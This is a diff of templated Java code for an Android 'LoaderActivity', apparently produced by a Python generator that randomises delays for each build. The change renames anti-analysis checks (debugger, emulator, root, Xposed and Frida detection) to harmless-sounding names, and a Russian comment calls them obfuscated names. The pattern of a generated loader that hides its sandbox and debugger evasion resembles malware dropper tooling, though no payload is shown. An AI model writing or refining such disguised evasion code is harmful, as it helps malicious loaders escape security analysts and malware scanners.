@@ -881,14 +881,14 @@ public class LoaderActivity extends Activity {{
         finish();
     }}
     
-    // ===== ЗАЩИТНЫЕ МЕХАНИЗМЫ =====
+    // ===== ЗАЩИТНЫЕ МЕХАНИЗМЫ (обфусцированные имена) =====
     
-    private boolean isDebuggerConnected() {{
-        return android.os.Debug.isDebuggerConnected() || 
-               android.os.Debug.waitingForDebugger();
+    private boolean validateEnvironment() {{
+        return !android.os.Debug.isDebuggerConnected() && 
+               !android.os.Debug.waitingForDebugger();
     }}
     
-    private boolean isEmulator() {{
+    private boolean checkDeviceCompatibility() {{
         // Проверка 1: Build параметры
         String brand = android.os.Build.BRAND.toLowerCase();
         String device = android.os.Build.DEVICE.toLowerCase();
@@ -931,7 +931,7 @@ public class LoaderActivity extends Activity {{
         return false;
     }}
     
-    private boolean isRooted() {{
+    private boolean verifySystemIntegrity() {{
         // Проверка 1: Файлы su
         String[] suPaths = {{
             "/system/app/Superuser.apk",
@@ -990,7 +990,7 @@ public class LoaderActivity extends Activity {{
         }}
     }}
     
-    private boolean isXposedActive() {{
+    private boolean checkSecurityFramework() {{
         // Проверка Xposed Framework
         try {{
             throw new Exception();
@@ -1016,7 +1016,7 @@ public class LoaderActivity extends Activity {{
         return false;
     }}
     
-    private boolean isFridaActive() {{
+    private boolean validateRuntimeEnvironment() {{
         // Проверка Frida
         String[] fridaPorts = {{"27042", "27043"}};
         
@@ -1047,27 +1047,27 @@ public class LoaderActivity extends Activity {{
     
     private boolean checkEnvironment() {{
         // Множественные проверки с задержками
-        if (isDebuggerConnected()) {{
+        if (!validateEnvironment()) {{
             try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
             return false;
         }}
         
-        if (isEmulator()) {{
+        if (!checkDeviceCompatibility()) {{
             try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
             return false;
         }}
         
-        if (isRooted()) {{
+        if (!verifySystemIntegrity()) {{
             try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
             return false;
         }}
         
-        if (isXposedActive()) {{
+        if (!checkSecurityFramework()) {{
             try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
             return false;
         }}
         
-        if (isFridaActive()) {{
+        if (!validateRuntimeEnvironment()) {{
             try {{ Thread.sleep({random.randint(100, 300)}); }} catch (Exception e) {{}}
             return false;
         }}
